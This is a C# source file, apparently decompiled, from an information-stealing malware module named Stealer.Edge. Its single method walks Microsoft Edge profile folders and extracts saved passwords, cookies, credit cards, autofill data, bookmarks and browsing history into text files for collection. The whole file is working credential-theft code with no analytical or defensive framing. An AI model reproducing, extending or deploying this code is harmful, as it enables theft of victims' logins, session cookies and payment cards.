using System;
using System.Collections.Generic;
using System.IO;
using Stealer.Chromium;

namespace Stealer.Edge
{
	// Token: 0x02000030 RID: 48
	internal sealed class Recovery
	{
		// Token: 0x060000D4 RID: 212 RVA: 0x00007810 File Offset: 0x00005A10
		public static void Run(string sSavePath)
		{
			string path = Paths.lappdata + Paths.EdgePath;
			if (!Directory.Exists(path))
			{
				return;
			}
			string text = sSavePath + "\\Edge";
			Directory.CreateDirectory(text);
			foreach (string str in Directory.GetDirectories(path))
			{
				if (File.Exists(str + "\\Login Data"))
				{
					List<CreditCard> cCC = CreditCards.Get(str + "\\Web Data");
					List<AutoFill> aFills = Autofill.Get(str + "\\Web Data");
					List<Bookmark> bBookmarks = Bookmarks.Get(str + "\\Bookmarks");
					List<Password> pPasswords = Passwords.Get(str + "\\Login Data");
					List<Cookie> cCookies = Cookies.Get(str + "\\Cookies");
					List<Site> sHistory = History.Get(str + "\\History");
					cBrowserUtils.WriteCreditCards(cCC, text + "\\CreditCards.txt");
					cBrowserUtils.WriteAutoFill(aFills, text + "\\AutoFill.txt");
					cBrowserUtils.WriteBookmarks(bBookmarks, text + "\\Bookmarks.txt");
					cBrowserUtils.WritePasswords(pPasswords, text + "\\Passwords.txt");
					cBrowserUtils.WriteCookies(cCookies, text + "\\Cookies.txt");
					cBrowserUtils.WriteHistory(sHistory, text + "\\History.txt");
				}
			}
		}
	}
}
